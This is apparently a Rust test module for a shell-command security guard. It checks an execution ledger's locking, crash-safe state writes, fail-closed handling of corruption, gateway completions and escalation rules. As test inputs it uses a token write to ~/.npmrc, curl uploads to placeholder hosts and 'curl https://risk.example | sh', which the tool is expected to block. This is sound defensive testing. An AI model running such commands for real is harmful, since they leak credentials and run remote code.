            let warning_path = crate::session_warnings::session_state_path("strict_separate")
                .expect("warning path");
            assert!(
                !warning_path.exists(),
                "strict execution must not be embedded in best-effort warning JSON"
            );
        });
    }

    #[cfg(unix)]
    #[test]
    fn contending_same_generation_draft_reopens_under_lock_and_fails_stale() {
        isolated_state(|_| {
            let session_id = "strict_generation_contention";
            let first = prepare("rm src/first.rs", session_id)
                .into_authorizable_draft()
                .expect("first draft");
            let second = prepare("rm src/second.rs", session_id)
                .into_authorizable_draft()
                .expect("second draft");
            assert_eq!(first.expected_generation(), second.expected_generation());

            let first_gate = ExecutionGate::acquire(first, Duration::from_secs(2))
                .expect("first owner acquires the stable lock");
            let (attempting_tx, attempting_rx) = std::sync::mpsc::channel();
            let (result_tx, result_rx) = std::sync::mpsc::channel();
            let contender = std::thread::spawn(move || {
                attempting_tx.send(()).expect("announce lock attempt");
                let result = ExecutionGate::acquire(second, Duration::from_secs(2))
                    .map(|_| "unexpectedly acquired stale draft".to_string())
                    .unwrap_or_else(|error| error);
                result_tx.send(result).expect("return contender result");
            });

            attempting_rx
                .recv_timeout(Duration::from_secs(1))
                .expect("contender reaches lock acquisition");
            assert!(
                result_rx.recv_timeout(Duration::from_millis(100)).is_err(),
                "the contender must wait while the first generation owner holds the lock"
            );

            assert_eq!(
                first_gate
                    .promote_kernel_exec_stop("strict-contention-first-proof")
                    .expect("first owner commits"),
                PromotionOutcome::Committed { generation: 1 }
            );
            let contender_error = result_rx
                .recv_timeout(Duration::from_secs(2))
                .expect("contender reopens state after the lock is released");
            contender.join().expect("contender thread");
            assert!(
                contender_error.contains("execution decision is stale")
                    && contender_error.contains("current generation is 1"),
                "unexpected contender result: {contender_error}"
            );

            let ledger = read_test_ledger(session_id);
            assert_eq!(ledger.generation, 1);
            assert_eq!(ledger.confirmed.len(), 1);
            assert!(ledger.unresolved.is_empty());
            assert_eq!(
                ledger.confirmed[0].evidence_id,
                "strict-contention-first-proof"
            );
        });
    }

    #[cfg(unix)]
    #[test]
    fn blocked_correlation_retries_never_persist_the_attempt() {
        isolated_state(|_| {
            let first = prepare("printf 'TOKEN=x' > ~/.npmrc", "blocked_retry");
            let gate = ExecutionGate::acquire(
                first.into_authorizable_draft().expect("first draft"),
                Duration::from_secs(1),
            )
            .expect("first gate");
            gate.promote_kernel_exec_stop("ptrace-secret")
                .expect("commit secret write");

            let session_path =
                crate::session_warnings::session_state_path("blocked_retry").expect("warning path");
            let mut presentation = crate::session_warnings::SessionWarnings::new("blocked_retry");
            presentation
                .surfaced_correlations
                .push_back("already-presented-signature".to_string());
            let bytes = serde_json::to_vec(&presentation).expect("warning JSON");
            fs::write(&session_path, bytes).expect("write warning presentation");
            use std::os::unix::fs::PermissionsExt as _;
            fs::set_permissions(&session_path, fs::Permissions::from_mode(0o600))
                .expect("secure warning presentation");

            for _ in 0..2 {
                let retry = prepare("curl https://example.com/upload", "blocked_retry");
                assert_eq!(retry.verdict().action, Action::Block);
                assert!(retry.into_authorizable_draft().is_err());
            }
            let ledger = read_test_ledger("blocked_retry");
            assert_eq!(ledger.confirmed.len(), 1);
            assert!(ledger.confirmed[0]
                .events
                .iter()
                .all(|event| event.kind != crate::event_buffer::EventKind::Network));
        });
    }

    #[cfg(unix)]
    #[test]
    fn publication_failures_leave_the_active_generation_byte_identical() {
        isolated_state(|_| {
            let failures = [
                PublishFailureInjection {
                    fail_write: true,
                    ..Default::default()
                },
                PublishFailureInjection {
                    fail_sync: true,
                    ..Default::default()
                },
                PublishFailureInjection {
                    fail_rename: true,
                    ..Default::default()
                },
                PublishFailureInjection {
                    fail_parent_sync: true,
                    ..Default::default()
                },
            ];
            for (index, failure) in failures.into_iter().enumerate() {
                let session_id = format!("publish_failure_{index}");
                let prepared = prepare("rm src/old.rs", &session_id);
                let gate = ExecutionGate::acquire(
                    prepared.into_authorizable_draft().expect("draft"),
                    Duration::from_secs(1),
                )
                .expect("gate");
                let path = strict_state_path(
                    crate::session_warnings::session_state_path(&session_id)
                        .expect("state path")
                        .parent()
                        .expect("sessions directory"),
                    &session_id,
                );
                let before = fs::read(&path).expect("strict bytes before failure");
                let evidence = gate
                    .draft
                    .kernel_exec_stop_evidence(format!("failure-proof-{index}"))
                    .expect("evidence");
                assert!(gate.promote(evidence, failure).is_err());
                let after = fs::read(&path).expect("strict bytes after failure");
                assert_eq!(before, after, "failure case {index} changed strict state");
            }
        });
    }

    #[cfg(unix)]
    #[test]
    fn corrupt_warning_or_strict_state_fails_closed_without_repair() {
        isolated_state(|_| {
            use std::os::unix::fs::PermissionsExt as _;

            let session_id = "corrupt_warning";
            let path = crate::session_warnings::session_state_path(session_id).expect("state path");
            fs::create_dir_all(path.parent().expect("sessions directory"))
                .expect("create sessions directory");
            fs::set_permissions(
                path.parent().expect("sessions directory"),
                fs::Permissions::from_mode(0o700),
            )
            .expect("secure sessions directory");
            fs::write(&path, b"{not-json").expect("corrupt warning fixture");
            fs::set_permissions(&path, fs::Permissions::from_mode(0o600))
                .expect("secure corrupt fixture");
            let before = fs::read(&path).expect("corrupt bytes");
            crate::session_warnings::record_typed_event(
                session_id,
                crate::event_buffer::TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    crate::event_buffer::EventKind::Network,
                    "corrupt-state-presentation-write",
                ),
            );
            assert_eq!(
                before,
                fs::read(&path).expect("corrupt bytes after best-effort writer"),
                "presentation recording must not launder corrupt legacy security history"
            );
            assert!(prepare_execution(
                &allow_verdict(),
                &Policy::default(),
                "echo ok",
                session_id,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .is_err());
            assert_eq!(before, fs::read(&path).expect("untouched corrupt bytes"));

            let strict_id = "corrupt_strict";
            drop(prepare("echo ok", strict_id));
            let strict_path = strict_state_path(
                crate::session_warnings::session_state_path(strict_id)
                    .expect("state path")
                    .parent()
                    .expect("sessions directory"),
                strict_id,
            );
            let mut strict_bytes = fs::read(&strict_path).expect("strict bytes");
            strict_bytes[..8].fill(0);
            strict_bytes[STRICT_STATE_SLOT_SIZE as usize..STRICT_STATE_SLOT_SIZE as usize + 8]
                .fill(0);
            fs::write(&strict_path, &strict_bytes).expect("corrupt both strict slots");
            fs::set_permissions(&strict_path, fs::Permissions::from_mode(0o600))
                .expect("secure strict fixture");
            assert!(prepare_execution(
                &allow_verdict(),
                &Policy::default(),
                "echo ok",
                strict_id,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .is_err());
            assert_eq!(
                strict_bytes,
                fs::read(&strict_path).expect("untouched strict corruption")
            );
        });
    }

    #[cfg(unix)]
    #[test]
    fn semantically_invalid_legacy_history_is_not_laundered_before_strict_import() {
        isolated_state(|_| {
            use std::os::unix::fs::PermissionsExt as _;

            let session_id = "duplicate_legacy_identity";
            let path = crate::session_warnings::session_state_path(session_id).expect("state path");
            fs::create_dir_all(path.parent().expect("sessions directory"))
                .expect("create sessions directory");
            fs::set_permissions(
                path.parent().expect("sessions directory"),
                fs::Permissions::from_mode(0o700),
            )
            .expect("secure sessions directory");

            let mut session = crate::session_warnings::SessionWarnings::new(session_id);
            let timestamp = chrono::Utc::now().to_rfc3339();
            let mut first = crate::event_buffer::TypedEvent::new(
                &timestamp,
                crate::event_buffer::EventKind::SecretWrite,
                "legacy-first",
            );
            first.sequence = 7;
            first.event_id = "legacy-first-id".to_string();
            let mut duplicate = crate::event_buffer::TypedEvent::new(
                &timestamp,
                crate::event_buffer::EventKind::Network,
                "legacy-duplicate",
            );
            duplicate.sequence = 7;
            duplicate.event_id = "legacy-second-id".to_string();
            session.typed_events.push_back(first);
            session.typed_events.push_back(duplicate);
            session.next_typed_event_sequence = 8;

            let bytes = serde_json::to_vec(&session).expect("serialize invalid legacy state");
            fs::write(&path, &bytes).expect("write invalid legacy state");
            fs::set_permissions(&path, fs::Permissions::from_mode(0o600))
                .expect("secure invalid legacy fixture");

            crate::session_warnings::record_typed_event(
                session_id,
                crate::event_buffer::TypedEvent::new(
                    &timestamp,
                    crate::event_buffer::EventKind::ProcessExec,
                    "presentation-mutation",
                ),
            );
            assert_eq!(
                bytes,
                fs::read(&path).expect("invalid state after presentation writer"),
                "best-effort migration must not repair duplicate strict identities"
            );
            assert!(prepare_execution(
                &allow_verdict(),
                &Policy::default(),
                "echo ok",
                session_id,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .is_err());
            assert_eq!(
                bytes,
                fs::read(&path).expect("invalid state after strict refusal")
            );
        });
    }

    #[cfg(unix)]
    #[test]
    fn unresolved_observation_upgrades_once_with_the_same_draft_identity() {
        isolated_state(|_| {
            let prepared = prepare("printf 'TOKEN=x' > ~/.npmrc", "late_upgrade");
            let gate = ExecutionGate::acquire(
                prepared.into_authorizable_draft().expect("draft"),
                Duration::from_secs(1),
            )
            .expect("gate");
            let (outcome, mut deferred) = gate
                .promote_gateway_unresolved("gateway-forwarded-1", Duration::from_secs(10))
                .expect("unresolved promotion");
            assert_eq!(outcome, PromotionOutcome::Committed { generation: 1 });
            let before = read_test_ledger("late_upgrade");
            assert_eq!(before.unresolved.len(), 1);
            assert!(before.confirmed.is_empty());

            let upgraded = deferred
                .promote_gateway_completed("gateway-result-1", Duration::from_secs(1))
                .expect("late confirmed upgrade");
            assert_eq!(upgraded, PromotionOutcome::Upgraded { generation: 2 });
            let after = read_test_ledger("late_upgrade");
            assert!(after.unresolved.is_empty());
            assert_eq!(after.confirmed.len(), 1);
            assert!(after.confirmed[0].is_confirmed());
            assert_eq!(after.confirmed[0].evidence_history.len(), 2);
            assert_eq!(
                after.confirmed[0].evidence_history[0].grade,
                ExecutionEvidenceGrade::GatewayForwardedUnresolved
            );
            assert_eq!(
                after.confirmed[0].evidence_history[1].grade,
                ExecutionEvidenceGrade::GatewayCompleted
            );
        });
    }

    #[cfg(unix)]
    #[test]
    fn gateway_permit_requires_the_exact_proxy_success_response_and_is_idempotent() {
        isolated_state(|_| {
            let proxy_id = "tirith-0123456789abcdef0123456789abcdef";
            let prepared = prepare_gateway("printf token > ~/.npmrc", "gateway_permit_exact");
            let mut permit = GatewayExecutionPermit::record_forwarded(
                prepared,
                proxy_id,
                Duration::from_secs(10),
                Duration::from_secs(1),
            )
            .expect("durable unresolved gateway forward");
            let unresolved = read_test_ledger("gateway_permit_exact");
            assert_eq!(unresolved.unresolved.len(), 1);
            assert!(unresolved.confirmed.is_empty());
            assert_eq!(
                unresolved.unresolved[0].evidence_grade,
                ExecutionEvidenceGrade::GatewayForwardedUnresolved
            );

            let wrong_id = serde_json::to_vec(&serde_json::json!({
                "jsonrpc": "2.0",
                "id": "tirith-ffffffffffffffffffffffffffffffff",
                "result": {"ok": true}
            }))
            .unwrap();
            assert!(permit
                .promote_completed_response(&wrong_id, Duration::from_secs(1))
                .is_err());
            let ambiguous = serde_json::to_vec(&serde_json::json!({
                "jsonrpc": "2.0",
                "id": proxy_id,
                "result": {"ok": true},
                "error": {"code": -1, "message": "forged"}
            }))
            .unwrap();
            assert!(permit
                .promote_completed_response(&ambiguous, Duration::from_secs(1))
                .is_err());
            assert_eq!(read_test_ledger("gateway_permit_exact"), unresolved);

            let response = serde_json::to_vec(&serde_json::json!({
                "jsonrpc": "2.0",
                "id": proxy_id,
                "result": {"ok": true}
            }))
            .unwrap();
            assert_eq!(
                permit
                    .promote_completed_response(&response, Duration::from_secs(1))
                    .expect("exact response upgrade"),
                PromotionOutcome::Upgraded { generation: 2 }
            );
            assert_eq!(
                permit
                    .promote_completed_response(&response, Duration::from_secs(1))
                    .expect("exact duplicate is idempotent"),
                PromotionOutcome::Idempotent { generation: 2 }
            );
            let changed = serde_json::to_vec(&serde_json::json!({
                "jsonrpc": "2.0",
                "id": proxy_id,
                "result": {"ok": false}
            }))
            .unwrap();
            assert!(permit
                .promote_completed_response(&changed, Duration::from_secs(1))
                .is_err());
            let confirmed = read_test_ledger("gateway_permit_exact");
            assert!(confirmed.unresolved.is_empty());
            assert_eq!(confirmed.confirmed.len(), 1);
            assert_eq!(confirmed.confirmed[0].evidence_history.len(), 2);
        });
    }

    #[cfg(unix)]
    #[test]
    fn rapid_gateway_completions_compact_only_clean_records_past_the_hard_cap() {
        isolated_state(|_| {
            let session_id = "gateway_clean_compaction";
            let mut security_bearing_execution = None;
            let mut first_clean_execution = None;

            for index in 0..(MAX_CONFIRMED_EXECUTIONS + 5) {
                let command = if index == 0 {
                    // A network event is live correlation evidence and must
                    // survive clean-record compaction.
                    "curl https://risk.example/data"
                } else {
                    "echo ok"
                };
                let prepared = prepare_gateway(command, session_id);
                let execution_id = prepared.draft.execution_id.clone();
                if index == 0 {
                    security_bearing_execution = Some(execution_id.clone());
                } else if index == 1 {
                    first_clean_execution = Some(execution_id.clone());
                }
                let proxy_id = format!("tirith-{index:032x}");
                let mut permit = GatewayExecutionPermit::record_forwarded(
                    prepared,
                    proxy_id.clone(),
                    Duration::from_secs(30),
                    Duration::from_secs(1),
                )
                .expect("rapid gateway forward remains available");
                let response = serde_json::to_vec(&serde_json::json!({
                    "jsonrpc": "2.0",
                    "id": proxy_id,
                    "result": {"ok": true}
                }))
                .unwrap();
                permit
                    .promote_completed_response(&response, Duration::from_secs(1))
                    .expect("rapid gateway completion remains available");
            }

            let ledger = read_test_ledger(session_id);
            assert_eq!(ledger.confirmed.len(), MAX_CONFIRMED_EXECUTIONS);
            assert!(ledger.unresolved.is_empty());
            let security_bearing_execution = security_bearing_execution.unwrap();
            let retained = ledger
                .confirmed
                .iter()
                .find(|record| record.execution_id == security_bearing_execution)
                .expect("live security-bearing gateway record is retained");
            assert!(
                !retained.events.is_empty(),
                "security-bearing record must keep its correlation events"
            );
            assert!(
                ledger
                    .confirmed
                    .iter()
                    .all(|record| record.execution_id != first_clean_execution.as_deref().unwrap()),
                "the oldest clean gateway completion should be compacted"
            );

            // Retention is policy-dependent, so expiration need not be a
            // prefix of durable sequence order. Prove the pruning pass removes
            // every eligible record behind a live front record.
            let mut mixed_retention = ledger.clone();
            let live_front = mixed_retention.confirmed[0].execution_id.clone();
            let expired_ids = [
                mixed_retention.confirmed[1].execution_id.clone(),
                mixed_retention.confirmed[3].execution_id.clone(),
            ];
            for index in [1usize, 3] {
                let record = &mut mixed_retention.confirmed[index];
                record.committed_unix_ms = 1;
                record.retention_until_unix_ms = 1;
                record.evidence_history[0].observed_unix_ms = 1;
            }
            let capacity = mixed_retention.confirmed.len();
            ensure_record_capacity(
                &mut mixed_retention.confirmed,
                capacity,
                RecordCompaction::CleanGatewayCompletions,
            )
            .expect("mixed retention capacity pruning");
            assert_eq!(mixed_retention.confirmed[0].execution_id, live_front);
            assert!(expired_ids.iter().all(|execution_id| mixed_retention
                .confirmed
                .iter()
                .all(|record| &record.execution_id != execution_id)));
        });
    }

    #[cfg(unix)]
    #[test]
    fn failed_gateway_upgrade_keeps_bytes_and_exact_retry_capability() {
        isolated_state(|_| {
            let proxy_id = "tirith-11111111111111111111111111111111";
            let prepared = prepare_gateway("curl https://example.test", "gateway_upgrade_retry");
            let mut permit = GatewayExecutionPermit::record_forwarded(
                prepared,
                proxy_id,
                Duration::from_secs(10),
                Duration::from_secs(1),
            )
            .expect("durable unresolved gateway forward");
            let response = serde_json::json!({
                "jsonrpc": "2.0",
                "id": proxy_id,
                "result": {"ok": true}
            });
            let response_identity = validate_gateway_success_response(
                &serde_json::to_vec(&response).unwrap(),
                proxy_id,
            )
            .expect("response identity");
            let evidence_id = format!("gateway-result-{response_identity}");
            let state = crate::session_warnings::session_state_path("gateway_upgrade_retry")
                .expect("state path");
            let strict = strict_state_path(
                state.parent().expect("state parent"),
                "gateway_upgrade_retry",
            );
            let before = fs::read(&strict).expect("strict bytes before injected failure");
            assert!(matches!(
                permit.deferred.promote_gateway_completed_with_failures(
                    evidence_id.clone(),
                    Duration::from_secs(1),
                    PublishFailureInjection {
                        fail_write: true,
                        ..Default::default()
                    },
                ),
                Err(GatewayCompletionError::Retryable(_))
            ));
            assert_eq!(
                before,
                fs::read(&strict).expect("strict bytes after failure")
            );
            assert_eq!(
                read_test_ledger("gateway_upgrade_retry").unresolved.len(),
                1
            );
            assert!(permit
                .deferred
                .promote_gateway_completed("gateway-result-changed", Duration::from_secs(1))
                .is_err());
            assert_eq!(
                permit
                    .deferred
                    .promote_gateway_completed(evidence_id, Duration::from_secs(1))
                    .expect("exact retry succeeds"),
                PromotionOutcome::Upgraded { generation: 2 }
            );
        });
    }

    #[cfg(unix)]
    #[test]
    fn gateway_completion_errors_distinguish_invalid_rejected_and_commit_unknown() {
        isolated_state(|_| {
            let proxy_id = "tirith-22222222222222222222222222222222";
            let prepared = prepare_gateway("curl https://example.test", "gateway_error_types");
            let mut permit = GatewayExecutionPermit::record_forwarded(
                prepared,
                proxy_id,
                Duration::from_secs(10),
                Duration::from_secs(1),
            )
            .expect("durable unresolved gateway forward");

            let wrong = serde_json::to_vec(&serde_json::json!({
                "jsonrpc": "2.0",
                "id": "tirith-ffffffffffffffffffffffffffffffff",
                "result": {"ok": true}
            }))
            .unwrap();
            assert!(matches!(
                permit.promote_completed_response(&wrong, Duration::from_secs(1)),
                Err(GatewayCompletionError::InvalidResponse(_))
            ));

            let response = serde_json::to_vec(&serde_json::json!({
                "jsonrpc": "2.0",
                "id": proxy_id,
                "result": {"ok": true}
            }))
            .unwrap();
            let identity = validate_gateway_success_response(&response, proxy_id)
                .expect("valid completion identity");
            let evidence_id = format!("gateway-result-{identity}");
            assert!(matches!(
                permit.deferred.promote_gateway_completed_with_failures(
                    evidence_id,
                    Duration::from_secs(1),
                    PublishFailureInjection {
                        fail_commit_sync: true,
                        fail_recovery_sync: true,
                        ..Default::default()
                    },
                ),
                Err(GatewayCompletionError::CommitUnknown(_))
            ));

            permit.deferred.upgrade_deadline = Instant::now();
            assert!(matches!(
                permit.promote_completed_response(&response, Duration::from_secs(1)),
                Err(GatewayCompletionError::Rejected(_))
            ));
        });
    }

    #[cfg(unix)]
    #[test]
    fn gateway_completion_rejects_permanent_strict_state_corruption_without_retrying() {
        isolated_state(|_| {
            let proxy_id = "tirith-33333333333333333333333333333333";
            let prepared = prepare_gateway("curl https://example.test", "gateway_corrupt_state");
            let mut permit = GatewayExecutionPermit::record_forwarded(
                prepared,
                proxy_id,
                Duration::from_secs(10),
                Duration::from_secs(1),
            )
            .expect("durable unresolved gateway forward");
            let state = crate::session_warnings::session_state_path("gateway_corrupt_state")
                .expect("state path");
            let strict = strict_state_path(
                state.parent().expect("state parent"),
                "gateway_corrupt_state",
            );
            OpenOptions::new()
                .write(true)
                .open(strict)
                .expect("open strict state")
                .set_len(1)
                .expect("truncate strict state");
            let response = serde_json::to_vec(&serde_json::json!({
                "jsonrpc": "2.0",
                "id": proxy_id,
                "result": {"ok": true}
            }))
            .unwrap();

            assert!(matches!(
                permit.promote_completed_response(&response, Duration::from_secs(1)),
                Err(GatewayCompletionError::Rejected(_))
            ));
        });
    }

    #[cfg(unix)]
    #[test]
    fn legacy_security_history_imports_once_as_unresolved_and_json_is_then_ignored() {
        isolated_state(|_| {
            let session_id = "legacy_import_once";
            let mut legacy = crate::session_warnings::SessionWarnings::new(session_id);
            legacy
                .typed_events
                .push_back(crate::event_buffer::TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    crate::event_buffer::EventKind::SecretWrite,
                    "legacy_secret_write",
                ));
            let source_bytes = write_legacy_session(&legacy);

            let initialized = prepare("true", session_id);
            assert_eq!(initialized.verdict().action, Action::Allow);
            let imported = read_test_ledger(session_id);
            assert_eq!(
                imported.legacy_source_sha256.as_deref(),
                Some(sha256_hex(&source_bytes).as_str())
            );
            assert_eq!(imported.legacy_typed_events.len(), 1);
            assert_eq!(
                imported.legacy_typed_events[0].provenance,
                crate::event_buffer::EventProvenance::Unresolved
            );

            let json_path =
                crate::session_warnings::session_state_path(session_id).expect("legacy JSON path");
            fs::write(&json_path, b"corrupt after strict import")
                .expect("replace presentation JSON");
            let correlated = prepare_execution(
                &allow_verdict(),
                &Policy::default(),
                "curl https://egress.example/data",
                session_id,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("strict state no longer reads presentation JSON");
            assert_eq!(correlated.verdict().action, Action::Block);
            assert!(correlated
                .verdict()
                .findings
                .iter()
                .any(|finding| finding.description.contains("does not assert")));
        });
    }

    #[cfg(unix)]
    #[test]
    fn deleted_strict_state_with_initialization_anchor_fails_closed() {
        isolated_state(|_| {
            let session_id = "anchored_delete";
            let _ = prepare("true", session_id);
            let state = crate::session_warnings::session_state_path(session_id).expect("state");
            let strict = strict_state_path(state.parent().expect("state parent"), session_id);
            fs::remove_file(&strict).expect("simulate strict-state deletion");
            let error = prepare_execution(
                &allow_verdict(),
                &Policy::default(),
                "true",
                session_id,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect_err("anchored deletion must not re-import mutable JSON");
            assert!(error.contains("anchor"), "{error}");
        });
    }

    #[cfg(unix)]
    #[test]
    fn failed_strict_initialization_cleanup_is_identity_bound_and_reports_cleanup_failure() {
        isolated_state(|temporary| {
            use std::os::unix::fs::OpenOptionsExt as _;

            let removed_path = temporary.path().join("failed-initialization.execution");
            let removed = OpenOptions::new()
                .read(true)
                .write(true)
                .create_new(true)
                .mode(0o600)
                .open(&removed_path)
                .expect("create failed-initialization fixture");
            let removed_identity =
                secure_regular_identity(&removed, "failed-initialization fixture")
                    .expect("fixture identity");
            cleanup_failed_strict_state_initialization(&removed_path, &removed, removed_identity)
                .expect("identity-bound cleanup and parent sync");
            assert!(matches!(
                fs::symlink_metadata(&removed_path),
                Err(error) if error.kind() == std::io::ErrorKind::NotFound
            ));

            let replaced_path = temporary.path().join("replaced-initialization.execution");
            let displaced_path = temporary.path().join("displaced-initialization.execution");
            let original = OpenOptions::new()
                .read(true)
                .write(true)
                .create_new(true)
                .mode(0o600)
                .open(&replaced_path)
                .expect("create original initialization fixture");
            let original_identity =
                secure_regular_identity(&original, "original initialization fixture")
                    .expect("original identity");
            fs::rename(&replaced_path, &displaced_path).expect("displace original fixture");
            let replacement = OpenOptions::new()
                .read(true)
                .write(true)
                .create_new(true)
                .mode(0o600)
                .open(&replaced_path)
                .expect("create replacement fixture");
            let replacement_identity =
                secure_regular_identity(&replacement, "replacement initialization fixture")
                    .expect("replacement identity");

            let cleanup_error = cleanup_failed_strict_state_initialization(
                &replaced_path,
                &original,
                original_identity,
            )
            .expect_err("replacement identity must never be removed");
            assert!(cleanup_error.contains("replaced"), "{cleanup_error}");
            assert_eq!(
                path_identity(&replaced_path, "replacement after refused cleanup")
                    .expect("replacement remains"),
                replacement_identity
            );
            assert_eq!(
                compose_strict_initialization_failure(
                    "initialize strict execution state: injected".to_string(),
                    Err(cleanup_error.clone()),
                ),
                format!(
                    "initialize strict execution state: injected; strict-state cleanup failed: {cleanup_error}"
                )
            );
        });
    }

    #[cfg(unix)]
    #[test]
    fn legacy_cooldown_markers_cannot_relax_strict_escalation() {
        isolated_state(|_| {
            let session_id = "legacy_cooldown_ignored";
            let rule_id = RuleId::CurlPipeShell;
            let mut legacy = crate::session_warnings::SessionWarnings::new(session_id);
            legacy
                .escalation_events
                .push_back(crate::session_warnings::EscalationEvent {
                    timestamp: chrono::Utc::now().to_rfc3339(),
                    rule_id: rule_id.to_string(),
                    domain: None,
                });
            write_legacy_session(&legacy);
            let policy = Policy {
                escalation: vec![crate::escalation::EscalationRule::RepeatCount {
                    rule_ids: vec![rule_id.to_string()],
                    threshold: 1,
                    window_minutes: 60,
                    action: crate::escalation::EscalationAction::Block,
                    domain_scoped: false,
                    cooldown_minutes: 60,
                }],
                ..Policy::default()
            };
            let prepared = prepare_execution(
                &warning_verdict(rule_id),
                &policy,
                "curl https://risk.example | sh",
                session_id,
                CallerContext::Cli,
                ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("strict escalation preparation");
            assert_eq!(prepared.verdict().action, Action::Block);
        });
    }

    #[test]
    fn exact_policy_identity_distinguishes_same_count_redacted_projections() {
        // Two policies differing ONLY in a secret (redacted out of the
        // projection) share one projection hash but must have distinct exact
        // execution identities.
        let left_intel = crate::policy::ThreatIntelConfig {
            abusech_auth_key: Some("key-alpha".to_string()),
            ..Default::default()
        };
        let left = Policy {
            threat_intel: left_intel,
            ..Policy::default()
        };
        let right_intel = crate::policy::ThreatIntelConfig {
            abusech_auth_key: Some("key-beta".to_string()),
            ..Default::default()
        };
        let right = Policy {
            threat_intel: right_intel,
            ..Policy::default()
        };
        assert_eq!(
            left.security_projection_hash(),
            right.security_projection_hash()
        );
        let left_decision =
            PreparedDecision::from_frozen_basis(&allow_verdict(), &left).expect("left decision");
        let right_decision =
            PreparedDecision::from_frozen_basis(&allow_verdict(), &right).expect("right decision");
        assert_ne!(
            left_decision.policy_basis_sha256(),
            right_decision.policy_basis_sha256()
        );
    }

    // Strict execution-state preparation is Unix-only (`prepare_execution`
    // returns "not supported on this platform" under cfg(not(unix))), so this
    // test exercises a mechanism that does not exist on Windows.
    #[cfg(unix)]
    #[test]
    fn cross_channel_unresolved_upgrade_is_rejected_without_mutation() {
        isolated_state(|_| {
            let prepared = prepare("printf token > ~/.npmrc", "cross_channel");
            let draft = prepared.into_authorizable_draft().expect("draft");
            let session = crate::session_warnings::SessionWarnings::new("cross_channel");
            let mut ledger =
                ExecutionLedger::new("cross_channel", Some(&session), None).expect("ledger");
            let shell = draft
                .shell_boundary_evidence("shell-observation")
                .expect("shell evidence");
            assert!(promote_record(&mut ledger, &draft, &shell).is_ok());
            let before = ledger.clone();
            let gateway = draft
                .gateway_completed_evidence("gateway-completion")
                .expect("gateway evidence");
            assert!(promote_record(&mut ledger, &draft, &gateway).is_err());
            assert_eq!(ledger, before);
        });
    }

    #[cfg(unix)]
    #[test]
    fn one_semantically_invalid_slot_recovers_from_the_valid_peer() {
        isolated_state(|_| {
            let session_id = "semantic_slot_recovery";
            let _ = prepare("true", session_id);
            let state = crate::session_warnings::session_state_path(session_id).expect("state");
            let parent = state.parent().expect("state parent");
            let (mut file, ledger, active, _, _) =
                open_or_initialize_strict_state(parent, session_id, None, None)
                    .expect("strict state");
            let mut invalid = ledger.clone();
            invalid.generation = invalid.generation.saturating_add(1);
            invalid.next_sequence = 0;
            write_slot_frame(&mut file, if active == 0 { 1 } else { 0 }, &invalid)
                .expect("write checksum-valid semantic corruption");
            file.sync_all().expect("sync semantic corruption");
            drop(file);
            let (_, recovered, _, _, _) =
                open_or_initialize_strict_state(parent, session_id, None, None)
                    .expect("recover valid peer");
            assert_eq!(recovered, ledger);
        });
    }

    #[cfg(unix)]
    #[test]
    fn checksum_valid_newer_schema_never_falls_back_to_older_slot() {
        isolated_state(|_| {
            let session_id = "newer_schema_refusal";
            let _ = prepare("true", session_id);
            let state = crate::session_warnings::session_state_path(session_id).expect("state");
            let parent = state.parent().expect("state parent");
            let (mut file, ledger, active, _, _) =
                open_or_initialize_strict_state(parent, session_id, None, None)
                    .expect("strict state");
            let mut newer = ledger;
            newer.schema_version = EXECUTION_LEDGER_SCHEMA_VERSION + 1;
            newer.generation = newer.generation.saturating_add(1);
            write_slot_frame(&mut file, if active == 0 { 1 } else { 0 }, &newer)
                .expect("write newer checksum-valid schema");
            file.sync_all().expect("sync newer schema");
            drop(file);
            let error = open_or_initialize_strict_state(parent, session_id, None, None)
                .expect_err("newer schema must not fall back");
            assert!(error.contains("unsupported checksum-valid"), "{error}");
        });
    }

    // Strict execution-state preparation is Unix-only (`prepare_execution`
    // returns "not supported on this platform" under cfg(not(unix))), so this
    // test exercises a mechanism that does not exist on Windows.
    #[cfg(unix)]
    #[test]
    fn in_memory_replay_is_idempotent_and_mismatch_is_rejected() {
        isolated_state(|_| {
            let prepared = prepare("rm src/old.rs", "replay_identity");
            let draft = prepared.into_authorizable_draft().expect("draft");
            let session = crate::session_warnings::SessionWarnings::new("replay_identity");
            let mut ledger =
                ExecutionLedger::new("replay_identity", Some(&session), None).expect("ledger");
            let evidence = draft
                .kernel_exec_stop_evidence("ptrace-replay")
                .expect("evidence");
            assert_eq!(
                promote_record(&mut ledger, &draft, &evidence).expect("first promotion"),
                PromotionOutcome::Committed { generation: 1 }
            );
            assert_eq!(
                promote_record(&mut ledger, &draft, &evidence).expect("exact replay"),
                PromotionOutcome::Idempotent { generation: 1 }
            );
            let changed_evidence = draft
                .kernel_exec_stop_evidence("different-proof")
                .expect("changed evidence");
            assert!(promote_record(&mut ledger, &draft, &changed_evidence).is_err());
        });
    }
}
